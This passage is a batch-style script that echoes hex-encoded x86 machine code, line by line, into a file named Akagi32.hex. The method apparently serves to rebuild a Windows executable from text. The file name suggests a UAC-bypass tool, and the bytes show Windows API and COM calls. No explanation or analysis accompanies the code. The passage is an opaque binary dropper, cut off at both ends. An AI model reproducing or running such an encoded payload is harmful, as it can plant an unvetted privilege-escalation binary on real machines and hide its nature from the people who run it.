echo 68 68 95 40 00 57 ff 15 d4 90 40 00 a3 48 d4 40 00 85 c0 0f 84 68 01 00 00 68 74 95 40 00 57 ff 15 d4 90 40 00 a3 4c d4 40 00 85 c0 0f 84 4f 01 00 00 68 88 95 40 00 57 ff 15 d4 90 40 00 a3 50 d4 40 00 85 c0 0f 84 36 01 00 00 8b 54 24 18 8d 44 24 14 8b 4c 24 0c 50 8d 44 24 14 50 e8 2c d3 ff ff eb 17 8b 54 24 18 8d 44 24 14 8b 4c 24 0c 50 8d 44 24 14 50 e8 ee d1 ff ff 8b 5c 24 18 8b>>Akagi32.hex
echo e 4480>>Akagi32.hex
echo f0 59 59 85 f6 0f 84 f6 00 00 00 8d 44 24 28 b9 20 08 00 00 c6 00 00 40 83 e9 01 75 f7 bf b2 e2 40 00 8d 4c 24 28 8b d7 e8 50 c2 ff ff ba c4 a7 40 00 e8 ae c1 ff ff ff 74 24 14 8b d3 8d 4c 24 2c e8 bd 16 00 00 8b f0 59 85 f6 0f 84 b0 00 00 00 b9 10 04 00 00 8d 84 24 48 08 00 00 c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00 8d 8c 24 48 08 00 00 e8 06 c2 ff ff ba b0 a7 40 00 e8 64 c1 ff>>Akagi32.hex
echo e 4500>>Akagi32.hex
echo ff 8d 84 24 48 08 00 00 50 8d 44 24 2c 50 e8 20 0f 00 00 8b f0 59 59 85 f6 74 66 8b d7 8d 4c 24 28 e8 d7 c1 ff ff ba e0 a8 40 00 e8 35 c1 ff ff ff 75 14 8b 55 10 8d 4c 24 2c e8 44 16 00 00 8b f0 59 85 f6 74 3b 8d 84 24 48 08 00 00 50 8d 44 24 2c 50 e8 db 0e 00 00 8b f0 59 59 85 f6 74 21 ba c4 a7 40 00 8d 8c 24 48 08 00 00 e8 f4 c0 ff ff 33 d2 8d 8c 24 48 08 00 00 e8 06 19 00 00 8b>>Akagi32.hex
echo e 4580>>Akagi32.hex
echo f0 8b 44 24 0c 50 ff 15 b8 90 40 00 ff 74 24 24 ff 15 fc 90 40 00 ff 74 24 20 ff 15 fc 90 40 00 85 db 74 0f 53 6a 00 ff 35 84 e0 40 00 ff 15 ec 91 40 00 8b c6 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 68 06 00 00 53 56 57 8b f9 33 db 85 ff 0f 84 b8 00 00 00 ba 10 04 00 00 8d 85 9c f9 ff ff 88 18 40 83 ea 01 75 f8 ba 04 01 00 00 8d 8d 9c f9 ff ff 52 57 e8 66 c1 ff ff 59 59 ba 80 a8 40 00>>Akagi32.hex
echo e 4600>>Akagi32.hex
echo 8d 8d 9c f9 ff ff e8 5a c0 ff ff 6a 14 5a 52 68 80 a9 40 00 8d 8d 9c f9 ff ff e8 13 c1 ff ff 8b c8 e8 39 c1 ff ff 59 59 b9 50 02 00 00 8d 85 ac fd ff ff 88 18 40 83 e9 01 75 f8 8d 85 ac fd ff ff 50 8d 85 9c f9 ff ff 50 ff 15 d0 90 40 00 8b f0 83 fe ff 74 32 ff 75 10 8d 85 ac fd ff ff ff 75 0c 57 50 e8 a7 fb ff ff 8b d8 85 db 75 12 8d 85 ac fd ff ff 50 56 ff 15 c8 90 40 00 85 c0 75>>Akagi32.hex
echo e 4680>>Akagi32.hex
echo d5 56 ff 15 c0 90 40 00 8b c3 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 83 e4 f8 81 ec 7c 0a 00 00 53 56 be 10 04 00 00 89 54 24 0c 57 89 4c 24 14 8d 44 24 18 33 db 8b fe 88 18 40 83 ef 01 75 f8 ba a8 e0 40 00 8d 4c 24 18 e8 2e c0 ff ff ba b0 a7 40 00 e8 8c bf ff ff ba c4 a7 40 00 8d 4c 24 18 e8 7e bf ff ff 8d 44 24 18 50 ff 15 9c 90 40 00 83 f8 ff 0f 85 f2 00 00 00 8d 44 24 18 88>>Akagi32.hex
echo e 4700>>Akagi32.hex
echo 18 40 83 ee 01 75 f8 ba 30 00 fe 7f 8d 4c 24 18 e8 e8 bf ff ff ba 1c a9 40 00 e8 46 bf ff ff 8d 54 24 18 8d 8c 24 78 06 00 00 e8 ce bf ff ff ba 60 9c 40 00 8d 4c 24 18 e8 28 bf ff ff b9 50 02 00 00 8d 84 24 28 04 00 00 88 18 40 83 e9 01 75 f8 8d 84 24 28 04 00 00 50 8d 44 24 1c 50 ff 15 d0 90 40 00 8b f0 83 fe ff 0f 84 8d 00 00 00 8b 7c 24 10 f6 84 24 28 04 00 00 10 74 54 66 83 bc>>Akagi32.hex
echo e 4780>>Akagi32.hex
echo 24 54 04 00 00 2e 74 49 ba 30 a9 40 00 8d 8c 24 54 04 00 00 e8 17 c0 ff ff 85 c0 74 34 8d 94 24 78 06 00 00 8d 4c 24 18 e8 50 bf ff ff 8d 94 24 54 04 00 00 e8 ac be ff ff 57 ff 74 24 18 51 8d 4c 24 24 e8 f4 fd ff ff 8b d8 83 c4 0c 85 db 75 13 8d 84 24 28 04 00 00 50 56 ff 15 c8 90 40 00 85 c0 75 8f 56 ff 15 c0 90 40 00 eb 0f ba b7 00 00 00 b9 f8 a8 40 00 e8 f5 13 00 00 5f 5e 8b c3>>Akagi32.hex
echo e 4800>>Akagi32.hex
echo 5b 8b e5 5d c3 55 8b ec 83 ec 3c 53 33 db 8d 45 dc 6a 08 89 5d fc 89 5d f8 59 88 18 40 83 e9 01 75 f8 56 8d 45 dc 50 ff 15 1c 92 40 00 85 c0 0f 88 8e 00 00 00 8b 4d e0 e8 03 be ff ff 8b 35 28 92 40 00 89 45 f4 33 c0 89 45 ec 8d 45 ec 68 8c a9 40 00 50 89 5d f0 ff d6 8d 45 ec c7 45 c4 18 00 00 00 89 45 cc 8d 45 c4 50 6a 08 8d 45 fc 89 5d c8 50 c7 45 d0 40 00 00 00 89 5d d4 89 5d d8>>Akagi32.hex
echo e 4880>>Akagi32.hex
echo ff 15 30 92 40 00 85 c0 78 39 ff 75 f4 33 c0 89 5d e8 89 45 e4 8d 45 e4 50 ff d6 8b 45 fc 89 45 c8 8d 45 e4 89 45 cc 8d 45 c4 50 68 0f 00 0f 00 8d 45 f8 50 ff 15 30 92 40 00 85 c0 78 05 33 db 43 eb 1a 8b 35 48 92 40 00 39 5d fc 74 05 ff 75 fc ff d6 39 5d f8 74 05 ff 75 f8 ff d6 83 7d e0 00 5e 74 0a 8d 45 dc 50 ff 15 50 92 40 00 8b c3 5b 8b e5 5d c3 55 8b ec 81 ec 40 08 00 00 53 33>>Akagi32.hex
echo e 4900>>Akagi32.hex
echo db 8b c1 21 5d f4 21 5d fc 89 45 ec 56 8b f2 57 85 c0 0f 84 b1 02 00 00 85 f6 0f 84 a9 02 00 00 8b 7d 0c 85 ff 0f 84 9e 02 00 00 8b cf e8 13 be ff ff 3d 04 01 00 00 0f 87 8c 02 00 00 b9 10 04 00 00 8d 85 c0 f7 ff ff 8b d1 88 18 40 83 ea 01 75 f8 8d 85 d0 fb ff ff 88 18 40 83 e9 01 75 f8 6a 04 68 00 30 00 00 8d 45 f8 c7 45 f8 fe ff 00 00 50 51 8d 45 f4 50 6a ff ff 15 5c 92 40 00 8b>>Akagi32.hex
echo e 4980>>Akagi32.hex
echo 45 f4 85 c0 0f 84 1c 02 00 00 89 45 e8 8d 45 e0 50 68 d1 6e 40 00 6a 00 c7 45 e0 b4 a9 40 00 c7 45 e4 d0 a9 40 00 ff 15 24 92 40 00 85 c0 0f 88 d3 01 00 00 8b 4d f4 e8 84 bc ff ff 89 45 f0 85 c0 0f 84 c0 01 00 00 8b c8 e8 77 bd ff ff 6a 04 68 00 30 00 00 8d 04 45 00 10 00 00 89 45 f8 8d 45 f8 50 6a 00 8d 45 fc 50 6a ff ff 15 5c 92 40 00 39 5d fc 0f 84 8d 01 00 00 ba b2 e2 40 00 8d>>Akagi32.hex
echo e 4a00>>Akagi32.hex
echo 8d c0 f7 ff ff e8 f3 bc ff ff ba b4 a9 40 00 e8 51 bc ff ff 8b 55 ec 8d 8d c0 f7 ff ff 56 e8 60 11 00 00 8b d8 59 85 db 0f 84 59 01 00 00 8b 4d fc ba a8 e0 40 00 e8 c2 bc ff ff 8b 75 08 85 f6 74 0a 8b 4d fc 8b d6 e8 19 bc ff ff 8b d7 8d 8d d0 fb ff ff e8 a4 bc ff ff 83 7d 14 00 ba 14 aa 40 00 75 05 ba 24 aa 40 00 e8 f7 bb ff ff 8b 4d fc 8d 95 d0 fb ff ff e8 c8 08 00 00 85 c0 0f 84>>Akagi32.hex
echo e 4a80>>Akagi32.hex
echo 03 01 00 00 8b 4d fc 8d 95 d0 fb ff ff e8 d3 bb ff ff 8b 55 f0 8b 4d fc e8 a7 08 00 00 85 c0 0f 84 e2 00 00 00 8b 4d fc ba 80 a8 40 00 e8 b3 bb ff ff 8b 55 f0 8b 4d fc e8 a8 bb ff ff ff 75 fc 8d 85 c0 f7 ff ff 50 e8 67 09 00 00 59 59 85 c0 0f 84 b1 00 00 00 83 7d 14 00 74 62 8b 4d fc ba a8 e0 40 00 e8 14 bc ff ff 85 f6 74 0a 8b 4d fc 8b d6 e8 6e bb ff ff 8b 4d fc 8b d7 e8 64 bb ff>>Akagi32.hex
echo e 4b00>>Akagi32.hex
echo ff 8b 4d fc ba 14 aa 40 00 e8 57 bb ff ff 8b d7 8d 8d d0 fb ff ff e8 e2 bb ff ff ba 24 aa 40 00 e8 40 bb ff ff 8b 4d fc 8d 95 d0 fb ff ff e8 25 07 00 00 8b d8 85 db 74 4e e8 c7 fc ff ff ba a8 e0 40 00 8d 8d d0 fb ff ff e8 af bb ff ff 85 f6 74 07 8b d6 e8 0c bb ff ff 8b 55 10 8d 8d d0 fb ff ff 85 d2 75 02 8b d7 e8 f8 ba ff ff 33 d2 8d 8d d0 fb ff ff e8 0b 13 00 00 68 e8 03 00 00 8b>>Akagi32.hex
echo e 4b80>>Akagi32.hex
echo d8 ff 15 a4 90 40 00 83 7d f4 00 74 19 83 65 f8 00 8d 45 f8 68 00 80 00 00 50 8d 45 f4 50 6a ff ff 15 60 92 40 00 83 7d fc 00 74 19 83 65 f8 00 8d 45 f8 68 00 80 00 00 50 8d 45 fc 50 6a ff ff 15 60 92 40 00 8b c3 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 20 08 00 00 53 56 57 8b f9 33 db 8b f2 85 ff 0f 84 d4 00 00 00 85 f6 0f 84 cc 00 00 00 b9 10 04 00 00 8d 85 f0 fb ff ff 88>>Akagi32.hex
echo e 4c00>>Akagi32.hex
echo 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d 8d f0 fb ff ff e8 e6 ba ff ff ba 34 aa 40 00 e8 44 ba ff ff 56 8b d7 8d 8d f0 fb ff ff e8 54 0f 00 00 59 85 c0 0f 84 84 00 00 00 be a8 e0 40 00 8d 8d e0 f7 ff ff 8b d6 e8 b3 ba ff ff 8b c1 50 8d 85 f0 fb ff ff 50 e8 da 07 00 00 59 59 85 c0 74 5d ba b2 e2 40 00 8d 8d f0 fb ff ff e8 8e ba ff ff ba 50 aa 40 00 e8 ec b9 ff ff 68 bc 01 00 00 ba e0>>Akagi32.hex
echo e 4c80>>Akagi32.hex
echo a1 40 00 8d 8d f0 fb ff ff e8 f5 0e 00 00 59 85 c0 74 29 8b d6 8d 8d e0 f7 ff ff e8 5d ba ff ff ba 6c aa 40 00 e8 bb b9 ff ff ba 84 aa 40 00 8d 8d e0 f7 ff ff e8 cb 11 00 00 8b d8 8b c3 eb 02 33 c0 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 08 02 00 00 83 3d 80 e0 40 00 00 56 8b f1 74 22 83 7e 18 00 74 1c b9 b8 aa 40 00 e8 16 14 00 00 68 5e 06 00 00 ff 15 d8 90 40 00 33 c0 e9 b7 00 00 00>>Akagi32.hex
echo e 4d00>>Akagi32.hex
echo a1 98 e0 40 00 3b 46 08 73 76 b9 08 02 00 00 8d 85 f8 fd ff ff c6 00 00 40 83 e9 01 75 f7 ba 14 ab 40 00 8d 8d f8 fd ff ff e8 cf b9 ff ff e8 ff b9 ff ff 8b 0d 98 e0 40 00 8b d0 e8 94 b8 ff ff ba 48 ab 40 00 8d 8d f8 fd ff ff e8 15 b9 ff ff 8d 8d f8 fd ff ff e8 d7 b9 ff ff 8b 4e 08 8b d0 e8 6f b8 ff ff ba 8c ab 40 00 8d 8d f8 fd ff ff e8 f0 b8 ff ff 8d 8d f8 fd ff ff e9 69 ff ff ff>>Akagi32.hex
echo e 4d80>>Akagi32.hex
echo 3b 46 0c 72 13 b9 b8 ab 40 00 e8 8f 13 00 00 83 f8 07 0f 84 56 ff ff ff 83 7e 1c 00 74 16 8b 15 a4 e0 40 00 85 d2 74 0c 03 d2 b9 bc e4 40 00 e8 3b 12 00 00 33 c0 40 5e 8b e5 5d c3 55 8b ec 83 ec 10 33 c0 53 56 89 45 f8 89 45 fc 89 45 f4 64 a1 18 00 00 00 57 8b f9 8b f7 8b 40 30 c1 e6 05 81 c6 08 d0 40 00 8b ce 8b 58 08 e8 d9 fe ff ff 85 c0 75 04 33 c0 eb 7e 8b 4e 10 83 f9 ff 74 37>>Akagi32.hex
echo e 4e00>>Akagi32.hex
echo 8d 45 f4 8b d3 50 e8 29 13 00 00 59 85 c0 74 16 8d 4d f8 51 ff 75 f4 50 ff 15 88 e0 40 00 83 c4 0c 89 45 fc eb 03 8b 45 fc 85 c0 75 0d 6a 0d ff 15 d8 90 40 00 eb bd 8b 45 fc ff 75 f8 33 db 50 53 57 ff 16 8b 4d fc 8b f0 85 c9 74 27 8b 55 f8 85 d2 74 08 88 19 41 83 ea 01 75 f8 68 00 80 00 00 8d 45 f0 89 5d f0 50 8d 45 fc 50 6a ff ff 15 60 92 40 00 8b c6 5f 5e 5b 8b e5 5d c3 33 c0 40>>Akagi32.hex
echo e 4e80>>Akagi32.hex
echo c2 10 00 55 8b ec ff 75 14 8b 55 10 8b 4d 08 e8 2f 08 00 00 59 5d c2 10 00 55 8b ec 33 c0 81 ec 0c 02 00 00 39 05 a4 e0 40 00 b9 bc e4 40 00 0f 44 c8 83 7d 08 04 74 13 83 7d 08 0b 75 26 8b 55 14 8b 4d 10 e8 96 dc ff ff eb 19 85 c9 75 10 ba 78 99 40 00 8d 8d f4 fd ff ff e8 1e b8 ff ff e8 97 da ff ff 8b e5 5d c2 10 00 b9 78 ac 40 00 e8 2a 12 00 00 83 f8 06 75 07 e8 a1 0b 00 00 eb 0d>>Akagi32.hex
echo e 4f00>>Akagi32.hex
echo 68 c7 04 00 00 ff 15 d8 90 40 00 33 c0 c2 10 00 55 8b ec 8b 4d 08 83 f9 06 75 2e 83 3d 80 e0 40 00 00 74 25 81 3d 98 e0 40 00 b1 1d 00 00 76 19 b9 b8 aa 40 00 e8 ca 11 00 00 68 5e 06 00 00 ff 15 d8 90 40 00 33 c0 eb 0c ff 75 14 8b 55 10 e8 54 ca ff ff 59 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 51 df ff ff 5d c2 10 00 55 8b ec 81 3d 98 e0 40 00 f0 23 00 00 ba 08 ad 40 00 b9 ec ac>>Akagi32.hex
echo e 4f80>>Akagi32.hex
echo 40 00 0f 43 ca ba 98 27 00 00 3b 15 98 e0 40 00 8b 55 10 1b c0 40 50 ff 75 14 e8 7c e1 ff ff 59 59 5d c2 10 00 6a 02 ff 15 d8 90 40 00 33 c0 c2 10 00 55 8b ec ff 75 14 8b 4d 08 ff 75 10 e8 03 e4 ff ff 59 59 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 1c e7 ff ff 5d c2 10 00 55 8b ec 81 ec 10 04 00 00 8d 85 f0 fb ff ff b9 10 04 00 00 c6 00 00 40 83 e9 01 75 f7 ba a8 e0 40 00 8d 8d f0>>Akagi32.hex
echo e 5000>>Akagi32.hex
echo fb ff ff e8 f5 b6 ff ff ba 50 96 40 00 e8 53 b6 ff ff ff 75 14 8d 8d f0 fb ff ff ff 75 10 e8 94 ea ff ff 59 59 8b e5 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 4d eb ff ff 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 35 05 00 00 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 c2 ef ff ff 5d c2 10 00 55 8b ec 8b 4d 10 85 c9 74 0e 8b 55 14 85 d2 74 07 e8 1e f6 ff ff eb 0a 6a 0d ff 15 d8 90 40>>Akagi32.hex
echo e 5080>>Akagi32.hex
echo 00 33 c0 5d c2 10 00 55 8b ec 83 7d 08 15 56 75 10 33 c0 b9 40 a6 40 00 ba 3c ad 40 00 8b f0 eb 2b 83 7d 08 16 75 39 b9 58 ad 40 00 e8 6d 10 00 00 83 f8 06 74 07 68 c7 04 00 00 eb 25 33 c0 ba d4 ad 40 00 40 be ec ad 40 00 33 c9 50 56 52 8b 55 14 51 8b 4d 10 e8 1a f8 ff ff 83 c4 10 eb 0a 6a 0d ff 15 d8 90 40 00 33 c0 5e 5d c2 10 00 55 8b ec 8b 55 14 8b 4d 10 e8 d5 fa ff ff 5d c2 10>>Akagi32.hex
echo e 5100>>Akagi32.hex
echo 00 83 3d a4 e0 40 00 00 b8 78 99 40 00 b9 bc e4 40 00 0f 44 c8 e8 ae ca ff ff c2 10 00 55 8b ec 83 7d 10 00 74 3c 83 7d 14 00 74 36 81 3d 98 e0 40 00 9f 3a 00 00 b8 ec ad 40 00 ff 75 14 ba 08 ae 40 00 b9 bc e4 40 00 ff 75 10 0f 42 d0 33 c0 39 05 a4 e0 40 00 0f 44 c8 e8 98 cd ff ff 59 59 eb 0a 6a 0d ff 15 d8 90 40 00 33 c0 5d c2 10 00 55 8b ec 8b 4d 10 85 c9 74 0e 8b 55 14 85 d2 74>>Akagi32.hex
echo e 5180>>Akagi32.hex
echo 07 e8 7b d1 ff ff eb 0a 6a 0d ff 15 d8 90 40 00 33 c0 5d c2 10 00 55 8b ec 81 ec 0c 02 00 00 8d 85 f4 fd ff ff b9 0a 02 00 00 c6 00 00 40 83 e9 01 75 f7 39 0d a4 e0 40 00 75 14 51 8d 95 f4 fd ff ff b9 78 99 40 00 e8 fe 10 00 00 59 eb 10 ba bc e4 40 00 8d 8d f4 fd ff ff e8 1e b5 ff ff 8d 8d f4 fd ff ff e8 8c d5 ff ff 8b e5 5d c2 10 00 55 8b ec 8b 4d 10 85 c9 74 0e 8b 55 14 85 d2 74>>Akagi32.hex
echo e 5200>>Akagi32.hex
echo 07 e8 63 06 00 00 eb 0a 6a 0d ff 15 d8 90 40 00 33 c0 5d c2 10 00 33 c0 b9 bc e4 40 00 39 05 a4 e0 40 00 0f 44 c8 51 e8 a6 d1 ff ff 59 c2 10 00 68 61 06 00 00 ff 15 d8 90 40 00 33 c0 c2 10 00 33 c0 b9 bc e4 40 00 39 05 a4 e0 40 00 0f 44 c8 e8 04 d3 ff ff c2 10 00 55 8b ec 51 51 53 56 33 f6 8b d9 89 75 fc 89 75 f8 57 8b fa 85 db 0f 84 c7 00 00 00 85 ff 0f 84 bf 00 00 00 8d 45 fc 50>>Akagi32.hex
echo e 5280>>Akagi32.hex
echo 68 f0 92 40 00 6a 07 56 68 10 93 40 00 ff 15 94 92 40 00 85 c0 0f 85 83 00 00 00 8b 4d fc 85 c9 74 06 8b 01 51 ff 50 08 8d 45 fc b9 50 ae 40 00 50 68 f0 92 40 00 6a 07 5a e8 28 05 00 00 59 59 85 c0 75 5a 8b 4d fc 85 c9 74 63 ff 35 a0 e0 40 00 8b 01 51 ff 50 14 8d 45 f8 50 68 e0 92 40 00 56 53 ff 15 7c 91 40 00 85 c0 75 32 8b 45 fc 56 57 ff 75 f8 8b 08 50 ff 51 30 85 c0 75 20 8b 45>>Akagi32.hex
echo e 5300>>Akagi32.hex
echo fc 50 8b 08 ff 51 54 85 c0 75 13 8b 45 f8 50 8b 08 ff 51 08 8b c6 33 f6 89 45 f8 46 eb 03 8b 45 f8 8b 4d fc 85 c9 74 09 8b 01 51 ff 50 08 8b 45 f8 85 c0 74 06 8b 08 50 ff 51 08 5f 8b c6 5e 5b 8b e5 5d c3 55 8b ec 51 51 53 56 33 f6 8b da 89 75 fc 89 75 f8 57 8b f9 85 db 0f 84 ca 00 00 00 85 ff 0f 84 c2 00 00 00 8d 45 fc 50 68 f0 92 40 00 6a 07 56 68 10 93 40 00 ff 15 94 92 40 00 85>>Akagi32.hex
echo e 5380>>Akagi32.hex
echo c0 0f 85 86 00 00 00 8b 4d fc 85 c9 74 06 8b 01 51 ff 50 08 8d 45 fc b9 50 ae 40 00 50 68 f0 92 40 00 6a 07 5a e8 3c 04 00 00 59 59 85 c0 75 5d 8b 4d fc 85 c9 74 66 ff 35 a0 e0 40 00 8b 01 51 ff 50 14 8d 45 f8 50 68 e0 92 40 00 56 57 ff 15 7c 91 40 00 85 c0 75 35 8b 45 fc 56 56 53 8b 08 6a 10 ff 75 f8 50 ff 51 50 85 c0 75 20 8b 45 fc 50 8b 08 ff 51 54 85 c0 75 13 8b 45 f8 50 8b 08>>Akagi32.hex
echo e 5400>>Akagi32.hex
echo ff 51 08 8b c6 33 f6 89 45 f8 46 eb 03 8b 45 f8 8b 4d fc 85 c9 74 09 8b 01 51 ff 50 08 8b 45 f8 85 c0 74 06 8b 08 50 ff 51 08 5f 8b c6 5e 5b 8b e5 5d c3 55 8b ec 83 ec 48 53 56 33 db 57 bf 05 40 00 80 89 5d fc 8b f7 89 5d f8 89 5d f4 39 5d 08 0f 84 1b 01 00 00 39 5d 0c 0f 84 12 01 00 00 6a 3c 59 8d 45 b8 88 18 40 83 e9 01 75 f8 8d 45 fc 50 68 f0 92 40 00 6a 07 53 68 10 93 40 00 ff>>Akagi32.hex
echo e 5480>>Akagi32.hex
echo 15 94 92 40 00 8b f0 85 f6 0f 85 b9 00 00 00 8b 4d fc 85 c9 74 06 8b 01 51 ff 50 08 8d 45 fc b9 50 ae 40 00 50 68 f0 92 40 00 6a 07 5a e8 34 03 00 00 8b f0 59 59 85 f6 0f 85 8a 00 00 00 8b 4d fc 85 c9 74 7c ff 35 a0 e0 40 00 8b 01 51 ff 50 14 8b 3d 7c 91 40 00 8d 45 f8 50 68 e0 92 40 00 53 ff 75 08 ff d7 8b f0 85 f6 75 5c 8d 45 f4 50 68 e0 92 40 00 53 ff 75 0c ff d7 8b f0 85 f6 75>>Akagi32.hex
echo e 5500>>Akagi32.hex
echo 47 8b 45 fc 53 53 ff 75 f4 8b 08 ff 75 f8 50 ff 51 38 8b f0 85 f6 75 30 8b 45 fc 50 8b 08 ff 51 54 8b f0 85 f6 75 21 8b 45 f4 50 8b 08 ff 51 08 8b 45 f8 89 5d f4 50 8b 08 ff 51 08 89 5d f8 eb 0a 8b 5d f8 8b f7 eb 06 8b 5d f8 8b 4d fc 85 c9 74 09 8b 01 51 ff 50 08 8b 5d f8 85 db 74 06 8b 03 53 ff 50 08 8b 4d f4 85 c9 74 06 8b 01 51 ff 50 08 f7 d6 c1 ee 1f 5f 8b c6 5e 5b 8b e5 5d c3>>Akagi32.hex
echo e 5580>>Akagi32.hex
echo 55 8b ec 81 ec 20 04 00 00 53 56 be 0a 02 00 00 89 55 fc 57 89 4d f8 8d 85 ec fd ff ff 33 db 8b fe 88 18 40 83 ef 01 75 f8 ba b2 e2 40 00 8d 8d ec fd ff ff e8 44 b1 ff ff ba a0 ae 40 00 e8 a2 b0 ff ff ff 75 fc 8b 55 f8 8d 8d ec fd ff ff e8 af 05 00 00 59 85 c0 0f 84 dd 00 00 00 bf a8 e0 40 00 8d 85 ec fd ff ff 57 50 e8 44 fe ff ff 59 59 85 c0 0f 84 c1 00 00 00 8b ce 8d 85 ec fd ff>>Akagi32.hex
echo e 5600>>Akagi32.hex
echo ff 88 18 40 83 e9 01 75 f8 8b d7 8d 8d ec fd ff ff e8 e7 b0 ff ff ba 40 a6 40 00 e8 45 b0 ff ff ba 3c ad 40 00 8d 8d ec fd ff ff e8 35 b0 ff ff 8b ce 8d 85 e0 fb ff ff 88 18 40 83 e9 01 75 f8 ba b2 e2 40 00 8d 8d e0 fb ff ff e8 ad b0 ff ff ba 80 a7 40 00 e8 0b b0 ff ff 53 8d 85 e0 fb ff ff 50 8d 85 ec fd ff ff 50 ff 15 84 90 40 00 85 c0 74 47 8d 85 e0 fb ff ff 57 50 e8 b3 fd ff ff>>Akagi32.hex
echo e 5680>>Akagi32.hex
echo 59 59 85 c0 74 34 8d 85 e0 fb ff ff 88 18 40 83 ee 01 75 f8 8b d7 8d 8d e0 fb ff ff e8 5c b0 ff ff ba 80 a7 40 00 e8 ba af ff ff 33 d2 8d 8d e0 fb ff ff e8 cd 07 00 00 8b d8 5f 5e 8b c3 5b 8b e5 5d c3 55 8b ec 81 ec 30 0c 00 00 53 56 8b da 8b f1 57 ba b2 e2 40 00 8d 8d e0 f7 ff ff 33 ff e8 18 b0 ff ff ba a8 e0 40 00 8d 8d d0 f3 ff ff e8 08 b0 ff ff ba a8 e0 40 00 8d 8d f0 fb ff ff>>Akagi32.hex
echo e 5700>>Akagi32.hex
echo e8 f8 af ff ff 83 ee 01 74 57 83 ee 01 74 4b 83 ee 01 74 1f 83 ee 05 74 13 83 ee 04 74 07 33 c0 e9 ba 00 00 00 ba cc ae 40 00 eb 3a ba 14 af 40 00 eb 33 ba f4 95 40 00 8d 8d e0 f7 ff ff e8 22 af ff ff ba e4 ae 40 00 8d 8d d0 f3 ff ff e8 12 af ff ff ba f0 ae 40 00 eb 3b ba b4 ae 40 00 eb 05 ba 14 a8 40 00 8d 8d e0 f7 ff ff e8 f4 ae ff ff be 40 a6 40 00 8d 8d d0 f3 ff ff 8b d6 e8 e2>>Akagi32.hex
echo e 5780>>Akagi32.hex
echo ae ff ff 8b d6 8d 8d f0 fb ff ff e8 d5 ae ff ff ba 3c ad 40 00 8d 8d f0 fb ff ff e8 c5 ae ff ff ff 75 08 8b d3 8d 8d e0 f7 ff ff e8 d3 03 00 00 59 85 c0 74 28 8d 85 d0 f3 ff ff 50 8d 85 e0 f7 ff ff 50 e8 6b fc ff ff 59 59 85 c0 74 0f 33 d2 8d 8d f0 fb ff ff e8 aa 06 00 00 8b f8 8b c7 5f 5e 5b 8b e5 5d c3 55 8b ec 81 ec 2c 02 00 00 56 8b f1 57 8b fa 85 f6 75 07 b8 05 40 00 80 eb 63>>Akagi32.hex
echo e 5800>>Akagi32.hex
echo e8 40 af ff ff 83 f8 40 77 ef b9 08 02 00 00 8d 85 d4 fd ff ff c6 00 00 40 83 e9 01 75 f7 ba 34 af 40 00 8d 8d d4 fd ff ff e8 cf ae ff ff 8b d6 e8 30 ae ff ff 6a 24 5a 8b ca 8d 45 dc c6 00 00 40 83 e9 01 75 f7 ff 75 0c 8d 45 dc 89 55 dc ff 75 08 89 7d f0 50 8d 85 d4 fd ff ff 50 ff 15 a8 92 40 00 5f 5e 8b e5 5d c3 55 8b ec 81 ec 38 0c 00 00 53 56 be 10 04 00 00 89 55 fc 57 89 4d f8>>Akagi32.hex
echo e 5880>>Akagi32.hex
echo 8d 85 c8 f3 ff ff 33 db 8b fe 88 18 40 83 ef 01 75 f8 8b ce 8d 85 d8 f7 ff ff 88 18 40 83 e9 01 75 f8 bf b2 e2 40 00 8d 8d c8 f3 ff ff 8b d7 e8 49 ae ff ff ba 34 96 40 00 e8 a7 ad ff ff ff 75 fc 8b 55 f8 8d 8d c8 f3 ff ff e8 b4 02 00 00 59 85 c0 0f 84 a6 00 00 00 8b d7 8d 8d d8 f7 ff ff e8 18 ae ff ff ba 70 af 40 00 e8 76 ad ff ff 68 3f 01 00 00 ba a0 a3 40 00 8d 8d d8 f7 ff ff e8>>Akagi32.hex
echo e 5900>>Akagi32.hex
echo 7f 02 00 00 59 85 c0 74 75 8b ce 8d 85 e8 fb ff ff 88 18 40 83 e9 01 75 f8 bf a8 e0 40 00 8d 8d e8 fb ff ff 8b d7 e8 d2 ad ff ff ba 8c af 40 00 e8 30 ad ff ff 8d 95 d8 f7 ff ff 8d 8d e8 fb ff ff e8 3f 05 00 00 85 c0 74 34 8d 85 e8 fb ff ff 88 18 40 83 ee 01 75 f8 8b d7 8d 8d e8 fb ff ff e8 98 ad ff ff ba 50 96 40 00 e8 f6 ac ff ff 33 d2 8d 8d e8 fb ff ff e8 09 05 00 00 8b d8 66 83>>Akagi32.hex
echo e 5980>>Akagi32.hex
echo bd d8 f7 ff ff 00 8b 35 c4 90 40 00 74 09 8d 85 d8 f7 ff ff 50 ff d6 66 83 bd c8 f3 ff ff 00 74 09 8d 85 c8 f3 ff ff 50 ff d6 5f 5e 8b c3 5b 8b e5 5d c3 55 8b ec 83 ec 28 53 56 57 8d 45 d8 33 ff 50 68 b8 af 40 00 8b d9 89 7d fc be 05 40 00 80 ff 15 a4 92 40 00 85 c0 0f 85 9c 00 00 00 8d 45 e8 50 68 08 b0 40 00 ff 15 a0 92 40 00 85 c0 0f 85 85 00 00 00 8d 45 fc 50 8d 45 e8 50 6a 07>>Akagi32.hex
echo e 5a00>>Akagi32.hex
echo 57 8d 45 d8 50 ff 15 94 92 40 00 8b f0 85 f6 75 6a 8d 45 fc b9 b8 af 40 00 50 8d 45 e8 50 6a 04 5a e8 c0 fd ff ff 8b f0 59 59 85 f6 75 4d 8b 4d fc 85 c9 74 63 8d 55 f8 89 7d f8 8b 01 52 6a 04 6a 04 53 51 ff 50 0c 8b 3d 90 90 40 00 85 c0 75 0a 39 75 f8 74 05 ff 75 f8 ff d7 8b 45 fc 68 f8 a4 40 00 6a 04 6a 04 8b 08 53 50 ff 51 10 8b f0 85 f6 75 07 68 f8 a4 40 00 ff d7 8b 4d fc 85 c9>>Akagi32.hex
echo e 5a80>>Akagi32.hex
